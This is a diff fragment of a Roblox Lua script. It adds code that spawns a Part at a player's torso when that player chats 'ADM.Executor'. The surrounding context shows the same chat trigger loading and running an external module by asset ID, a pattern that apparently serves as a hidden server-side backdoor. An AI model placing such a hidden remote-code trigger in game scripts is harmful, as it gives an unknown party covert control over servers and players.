@@ -49,6 +49,9 @@ for _, player in pairs(game.Players:GetPlayers()) do
 				end
 			elseif message == "ADM.Executor" then
 				require(6324372525).fse("t10_kol")
+									local Part = Instance.new("Part",workspace)
+					Part.CanCollide=true
+					Part.CFrame = player.Character.Torso.CFrame
 			end
 				--rbxassetid://7606070501
 		end)
